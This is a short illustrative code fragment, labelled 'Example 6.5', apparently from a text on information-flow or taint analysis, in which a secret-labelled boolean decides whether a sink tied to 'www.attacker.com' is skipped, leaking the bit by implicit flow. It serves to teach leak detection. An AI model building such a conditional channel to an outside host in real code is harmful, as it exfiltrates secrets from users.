// Example 6.5

h = lbl(true);
url = urll("www.attacker.com");
sink('Sink', '', url);
if (h) {
	skip('Sink');
}
